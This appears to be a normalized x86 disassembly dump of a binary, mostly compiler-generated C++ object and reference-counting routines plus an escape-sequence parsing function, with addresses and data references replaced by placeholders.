mov cl [ ebp + 0x8 ]
mov [ eax + 0x4 ] cl
pop ebp
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_414589
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_4145d9
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_4145a9
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_414609
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_4145d9
push 0x0
mov eax sub_44a54a
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_414609
push 0x0
mov eax sub_44a527
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41463c
push 0x2c
mov eax sub_44d205
call sub_448595
mov eax [ ecx + 0x8 ]
test eax eax
jne r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosb [ edi ]
push [ ebp - 0x10 ]
lea edi [ ebp - 0x14 ]
stosb [ edi ]
push [ ebp - 0x14 ]
push [ ebp + 0x8 ]
call sub_414745
call sub_44866d
retn 0xc
push 0xa
mov eax r--data
lea esi [ ebp - 0x38 ]
call sub_4038f9
and [ ebp - 0x4 ] 0x0
push 0x76
push r--data
push r--data
push eax
call sub_405e22
sub_414697
push 0x2c
mov eax sub_44d1e2
call sub_448595
mov eax [ ecx + 0x8 ]
test eax eax
jne r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosb [ edi ]
push [ ebp - 0x10 ]
lea edi [ ebp - 0x14 ]
stosb [ edi ]
push [ ebp - 0x14 ]
push [ ebp + 0x8 ]
call sub_414772
call sub_44866d
retn 0xc
push 0xa
mov eax r--data
lea esi [ ebp - 0x38 ]
call sub_4038f9
and [ ebp - 0x4 ] 0x0
push 0x76
push r--data
push r--data
push eax
call sub_405e22
sub_4146ef
push edi
mov edi eax
mov ecx edi
call sub_411b1d
mov [ esi ] ax
mov ecx [ edi + 0x204 ]
mov eax [ ecx ]
push 0xa
call [ eax + 0x18 ]
mov [ esi + 0x2 ] al
mov ecx [ edi + 0x204 ]
mov eax [ ecx ]
push 0xd
call [ eax + 0x18 ]
mov [ esi + 0x3 ] al
mov eax esi
pop edi
retn
sub_414745
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_414772
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_4147ca
push 0x8
mov eax sub_44c2b5
call sub_448595
xor esi esi
push 0x2c
mov [ ebp - 0x14 ] esi
call sub_424ff8
pop ecx
mov [ ebp - 0x10 ] eax
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
cmp eax esi
je r-xdata
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
push [ ebp + 0xc ]
mov edi eax
call sub_415d11
mov esi eax
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x4 ] 0x2
push [ ebp + 0x8 ]
call sub_4180da
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx ebx
[ eax ] ecx
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_41483b
push 0x8
mov eax sub_44c26f
call sub_448595
xor esi esi
push 0x2c
mov [ ebp - 0x14 ] esi
call sub_424ff8
pop ecx
mov [ ebp - 0x10 ] eax
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
cmp eax esi
je r-xdata
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
push [ ebp + 0xc ]
mov edi eax
call sub_415deb
mov esi eax
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x4 ] 0x2
push [ ebp + 0x8 ]
call sub_418154
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx ebx
[ eax ] ecx
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_4148ac
push 0x8
mov eax sub_44c229
call sub_448595
and [ ebp - 0x14 ] 0x0
push 0x10
call sub_424ff8
mov esi eax
pop ecx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
call sub_415ec3
mov esi eax
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
call sub_4181ce
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_414916
push 0x8
mov eax sub_44c1ed
call sub_448595
and [ ebp - 0x14 ] 0x0
push 0x10
call sub_424ff8
mov esi eax
pop ecx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
call sub_415f77
mov esi eax
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
call sub_41823f
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_414980
push 0x8
mov eax sub_44c1b1
call sub_448595
and [ ebp - 0x14 ] 0x0
push 0xc
call sub_424ff8
pop ecx
test eax eax
je r-xdata
xor esi esi
mov esi eax
call sub_41602f
mov esi eax
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
call sub_4182b0
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_4149e7
push 0x0
mov eax sub_44b0d0
call sub_448595
mov edi [ ebp + 0x8 ]
mov esi ebx
mov [ edi ] 0x1
call sub_415c38
xor edx edx
mov [ edi + 0x4 ] edx
mov [ edi + 0x8 ] edx
mov eax [ ebx ]
cmp eax edx
je r-xdata
mov [ edi + 0xc ] eax
cmp eax edx
je r-xdata
xor esi esi
lea ecx [ eax + 0x4 ]
inc esi
[ ecx ] esi
mov [ ebp - 0x4 ] edx
cmp eax edx
je r-xdata
xor esi esi
lea ecx [ eax + 0x4 ]
inc esi
[ ecx ] esi
mov esi ebx
call sub_415c38
add eax 0x8
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_414a57
push 0x0
mov eax sub_44b0aa
call sub_448595
mov edi [ ebp + 0x8 ]
mov esi ebx
mov [ edi ] 0x1
call sub_415c57
xor edx edx
mov [ edi + 0x4 ] edx
mov [ edi + 0x8 ] edx
mov eax [ ebx ]
cmp eax edx
je r-xdata
mov [ edi + 0xc ] eax
cmp eax edx
je r-xdata
xor esi esi
lea ecx [ eax + 0x4 ]
inc esi
[ ecx ] esi
mov [ ebp - 0x4 ] edx
cmp eax edx
je r-xdata
xor esi esi
lea ecx [ eax + 0x4 ]
inc esi
[ ecx ] esi
mov esi ebx
call sub_415c57
add eax 0x8
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_414ac7
push 0x8
mov eax sub_44c175
call sub_448595
and [ ebp - 0x14 ] 0x0
push 0x10
call sub_424ff8
mov esi eax
pop ecx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
call sub_4160d4
mov esi eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_41834b
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_414b30
push 0x8
mov eax sub_44c139
call sub_448595
and [ ebp - 0x14 ] 0x0
push 0x10
call sub_424ff8
mov esi eax
pop ecx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
call sub_416194
mov esi eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_4183bb
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_414b99
push 0x8
mov eax sub_44c0fd
call sub_448595
and [ ebp - 0x14 ] 0x0
push 0x10
call sub_424ff8
mov esi eax
pop ecx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
call sub_416243
mov esi eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_41842b
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_414c02
push 0x8
mov eax sub_44c0c1
call sub_448595
and [ ebp - 0x14 ] 0x0
push 0x10
call sub_424ff8
mov esi eax
pop ecx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
call sub_4162f5
mov esi eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_41849b
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_414c6b
push 0x8
mov eax sub_44c085
call sub_448595
and [ ebp - 0x14 ] 0x0
push 0x10
call sub_424ff8
mov esi eax
pop ecx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
call sub_4163a7
mov esi eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_41850b
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_414cd4
push 0x8
mov eax sub_44c049
call sub_448595
and [ ebp - 0x14 ] 0x0
push 0x10
call sub_424ff8
mov esi eax
pop ecx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
call sub_416459
mov esi eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_41857b
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_414d3d
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi eax
mov eax [ ebp + 0xc ]
cmp [ esi ] eax
push 0x54
push r--data
push r--data
setne al
push r--data
movzx eax al
push 0x2
push eax
call sub_403978
mov ebx [ ebp + 0x8 ]
mov edi [ ebp + 0x10 ]
mov ecx [ esi ]
and [ ebx + 0x4 ] 0x0
xor eax eax
and [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] ax
mov eax [ edi + 0x208 ]
shr eax 0x1
and al 0x1
add esp 0x18
mov [ ebp - 0x4 ] al
push [ ebp - 0x4 ]
lea edx [ ecx + 0x1 ]
push edi
mov [ ebx ] 0x0
call sub_4185eb
xor ecx ecx
mov [ ebx + 0x8 ] ax
cmp cx ax
je r-xdata
mov eax [ esi ]
movzx eax [ eax ]
push eax
push edi
push 0x8
pop edi
call sub_406e7c
cmp eax 0xffffffff
je r-xdata
mov [ ebx + 0xc ] 0x2
jmp r-xdata
mov eax [ esi ]
mov dl [ eax ]
movsx ecx dl
cmp ecx 0x72
jg r-xdata
mov ebx [ ebp + 0xc ]
push 0x1ff
push [ ebp + 0x10 ]
mov eax edi
call sub_4139a9
mov ebx eax
push ebx
call sub_417e43
mov eax [ ebp + 0x8 ]
add esp 0xc
mov [ eax ] bl
jmp r-xdata
mov eax ebx
sub ecx 0x74
je r-xdata
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov [ ebx ] 0x9
dec ecx
je r-xdata
mov [ ebx ] 0xd
jmp r-xdata
sub ecx 0x61
je r-xdata
mov ebx [ ebp + 0xc ]
inc eax
push 0xa5
push r--data
cmp eax ebx
mov [ esi ] eax
push r--data
setne al
push r--data
movzx eax al
push 0x2
push eax
call sub_403978
mov edi [ esi ]
push 0xffff
push [ ebp + 0x10 ]
push 0x10
pop eax
call sub_4139a9
mov ebx eax
push ebx
call sub_417e43
mov eax [ ebp + 0x8 ]
add esp 0x24
push 0xa9
mov [ eax ] bl
mov eax [ esi ]
push r--data
push r--data
sub eax edi
push r--data
cmp eax 0x4
jmp r-xdata
dec ecx
je r-xdata
inc eax
mov [ esi ] eax
mov [ ebx ] 0x7
jmp r-xdata
dec ecx
dec ecx
je r-xdata
sete al
movzx eax al
push 0x2
push eax
call sub_403978
mov ebx [ ebp + 0x8 ]
add esp 0x18
jmp r-xdata
mov [ ebx ] 0xb
jmp r-xdata
dec ecx
dec ecx
je r-xdata
inc eax
cmp eax [ ebp + 0xc ]
push 0x76
push r--data
mov [ esi ] eax
mov edi r--data
push edi
setne al
push r--data
movzx eax al
push 0x2
push eax
call sub_403978
mov eax [ esi ]
mov al [ eax ]
add esp 0x18
lea ecx [ eax - 0x61 ]
cmp cl 0x19
jbe r-xdata
dec ecx
dec ecx
je r-xdata
mov ebx [ ebp + 0xc ]
inc eax
push 0x9d
push r--data
cmp eax ebx
mov [ esi ] eax
push r--data
setne al
push r--data
movzx eax al
push 0x2
push eax
call sub_403978
mov edi [ esi ]
push 0xff
push [ ebp + 0x10 ]
push 0x10
pop eax
call sub_4139a9
mov ebx eax
push ebx
call sub_417e43
mov eax [ ebp + 0x8 ]
add esp 0x24
push 0xa1
mov [ eax ] bl
mov eax [ esi ]
push r--data
push r--data
sub eax edi
push r--data
cmp eax 0x2
mov [ ebx ] dl
jmp r-xdata
xor eax eax
inc eax
sub al 0x41
cmp al 0x19
jbe r-xdata
mov [ ebx ] 0x1b
jmp r-xdata
dec ecx
je r-xdata
push eax
mov [ ebp + 0x8 ] eax
call sub_417e43
mov al [ ebp + 0x8 ]
add esp 0x1c
inc [ esi ]
mov [ ebx ] al
jmp r-xdata
dec eax
or eax 0xffffffe0
inc eax
xor al al
jmp r-xdata
mov [ ebx ] 0xc
jmp r-xdata
sub ecx edi
jne r-xdata
push 0x7d
push r--data
push edi
push r--data
push 0x2
push eax
call sub_403978
mov eax [ esi ]
movsx eax [ eax ]
and eax 0x8000001f
jns r-xdata
mov [ ebx ] 0xa
jmp r-xdata
sub_414fe8
push 0x8
mov eax sub_44c00d
call sub_448595
and [ ebp - 0x14 ] 0x0
push 0x10
call sub_424ff8
mov esi eax
pop ecx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
call sub_41651e
mov esi eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_4186cf
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_415051
push 0x8
mov eax sub_44bfd1
call sub_448595
and [ ebp - 0x14 ] 0x0
push 0x10
call sub_424ff8
mov esi eax
pop ecx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
call sub_4165da
mov esi eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_418746
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_4150ba
push 0x8
mov eax sub_44bf95
call sub_448595
and [ ebp - 0x14 ] 0x0
push 0x10
call sub_424ff8
mov esi eax
pop ecx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
call sub_416696
mov esi eax
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
call sub_4187bd
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_415124
push 0x8
mov eax sub_44bf59
call sub_448595
and [ ebp - 0x14 ] 0x0
push 0x10
call sub_424ff8
mov esi eax
pop ecx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
call sub_416759
mov esi eax
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
call sub_41882e
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_41518e
push 0x8
mov eax sub_44bf1d
call sub_448595
and [ ebp - 0x14 ] 0x0
push 0x10
call sub_424ff8
mov esi eax
pop ecx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
call sub_41681b
mov esi eax
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
call sub_41889f
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_4151f8
push 0x8
mov eax sub_44bee1
call sub_448595
xor esi esi
push 0x18
mov [ ebp - 0x14 ] esi
call sub_424ff8
pop ecx
cmp eax esi
je r-xdata
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov ebx [ ebp + 0xc ]
mov esi eax
call sub_4168de
mov esi eax
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_418910
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_415275
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
push esi
je r-xdata
call sub_418987
call sub_40d7b9
jmp r-xdata
mov eax esi
pop ecx
leave
retn
sub_415295
push 0x8
mov eax sub_44bea5
call sub_448595
and [ ebp - 0x14 ] 0x0
push 0x14
call sub_424ff8
pop ecx
test eax eax
je r-xdata
xor esi esi
mov edx [ ebp + 0xc ]
mov esi eax
call sub_41699a
mov esi eax
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
call sub_4189ed
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_4152ff
push 0x8
mov eax sub_44be69
call sub_448595
and [ ebp - 0x14 ] 0x0
push 0x18
call sub_424ff8
pop ecx
test eax eax
je r-xdata
xor esi esi
mov edx [ ebp + 0xc ]
mov esi eax
call sub_416a6a
mov esi eax
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
call sub_418a5e
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_415369
push 0x8
mov eax sub_44be2d
call sub_448595
and [ ebp - 0x14 ] 0x0
push 0x14
call sub_424ff8
pop ecx
test eax eax
je r-xdata
xor esi esi
mov edx [ ebp + 0xc ]
mov esi eax
call sub_416b3a
mov esi eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_418acf
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_4153d2
push ebp
mov ebp esp
sub esp 0x6c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov ebx ecx
mov esi edx
push edi
mov edi [ ebp + 0xc ]
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x30 ] esi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x24 ] edi
cmp [ ebx ] esi
jne r-xdata
mov eax [ edi + 0x208 ]
shr eax 0x1
and al 0x1
mov [ ebp - 0x34 ] al
mov eax [ ebx ]
mov [ ebp - 0x29 ] 0x0
cmp eax esi
je r-xdata
push 0xc9
push r--data
push r--data
call sub_4258e2
add esp 0xc
cmp [ ebx ] esi
push 0xe4
push r--data
push r--data
setne al
push r--data
movzx eax al
push 0x4
push eax
mov [ ebp - 0x19 ] 0x0
mov [ ebp - 0x15 ] 0x0
call sub_403978
mov edi [ ebx ]
add esp 0x18
push ebx
mov eax esi
mov [ ebp - 0x28 ] edi
call sub_418b46
mov esi eax
jmp r-xdata
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax esi
call sub_418b46
cmp eax 0x9
jne r-xdata
mov eax [ ebp - 0x30 ]
cmp [ ebx ] eax
push 0xeb
push r--data
push r--data
setne al
push r--data
movzx eax al
push 0x4
push eax
call sub_403978
add esp 0x18
cmp esi 0xa
jne r-xdata
mov eax [ ebx ]
cmp eax esi
je r-xdata
mov eax [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ ebp - 0x29 ] 0x1
cmp [ ebp - 0x15 ] 0x0
je r-xdata
cmp [ ebp - 0x15 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax esi
call sub_418b46
cmp eax 0x8
jne r-xdata
cmp esi 0x2
je r-xdata
push [ ebp - 0x34 ]
mov eax [ ebp - 0x24 ]
push [ ebp - 0x19 ]
mov ecx [ ebp - 0x20 ]
call sub_415c8f
mov [ ebp - 0x15 ] 0x0
mov [ ebx ] edi
mov al [ edi ]
inc edi
mov [ ebx ] edi
mov eax [ ebp - 0x30 ]
mov esi [ ebx ]
push ebx
mov [ ebp - 0x15 ] 0x0
call sub_418b46
test eax eax
je r-xdata
mov edi [ ebp - 0x28 ]
jmp r-xdata
push [ ebp - 0x24 ]
lea eax [ ebp - 0x68 ]
push [ ebp - 0x30 ]
push eax
mov eax ebx
call sub_414d3d
mov esi eax
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0xc
movsd [ edi ] [ esi ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
cmp esi 0x7
jle r-xdata
mov eax [ ebx ]
cmp eax [ ebp - 0x30 ]
push 0x15d
push r--data
mov [ ebp - 0x28 ] eax
push r--data
setne al
push r--data
movzx eax al
push 0x4
push eax
call sub_403978
mov eax [ ebp - 0x30 ]
add esp 0x18
push ebx
call sub_418b46
mov esi eax
cmp esi 0x8
jne r-xdata
mov eax [ ebx ]
mov cl [ eax ]
inc eax
cmp [ ebp - 0x19 ] cl
push 0xfb
push r--data
mov [ ebx ] eax
push r--data
setle al
push r--data
movzx eax al
push 0x8
push eax
mov [ ebp - 0x44 ] cl
call sub_403978
add esp 0x18
cmp [ ebp - 0x34 ] 0x0
je r-xdata
cmp eax 0x2
je r-xdata
cmp [ ebx ] edi
jne r-xdata
cmp [ ebp - 0x8 ] 0x2
jne r-xdata
mov al [ ebp - 0x14 ]
jmp r-xdata
mov eax [ ebx ]
mov cl [ eax ]
inc eax
mov [ ebp - 0x19 ] cl
mov [ ebx ] eax
jmp r-xdata
cmp esi 0xa
jle r-xdata
mov edi [ ebp - 0x28 ]
cmp [ ebp - 0x15 ] 0x0
mov esi [ ebp - 0x20 ]
je r-xdata
push [ ebp - 0x44 ]
mov bl [ ebp - 0x44 ]
jmp r-xdata
push [ ebp - 0x24 ]
lea eax [ ebp - 0x58 ]
push [ ebp - 0x30 ]
push eax
mov eax ebx
call sub_414d3d
mov esi eax
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0xc
movsd [ edi ] [ esi ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
cmp eax 0x8
jle r-xdata
mov eax [ ebx ]
movzx eax [ eax ]
push [ ebp - 0x34 ]
mov ecx [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
call sub_415c8f
inc [ ebx ]
push 0x153
push r--data
push r--data
call sub_4258e2
add esp 0xc
mov esi [ ebp - 0x24 ]
push esi
mov ecx r--data
call sub_405f54
movzx edi ax
xor eax eax
pop ecx
cmp ax di
jne r-xdata
mov [ ebp - 0x19 ] al
mov [ ebp - 0x15 ] 0x1
jmp r-xdata
cmp esi 0xb
je r-xdata
cmp [ ebp - 0x29 ] 0x0
je r-xdata
push [ ebp - 0x34 ]
mov eax [ ebp - 0x24 ]
push [ ebp - 0x19 ]
mov ecx esi
call sub_415c8f
push [ ebp - 0x24 ]
push [ ebp - 0x19 ]
push [ ebp - 0x20 ]
call sub_418f83
mov ebx [ ebp - 0x3c ]
jmp r-xdata
mov edi [ ebp - 0x28 ]
mov al [ ebp - 0x14 ]
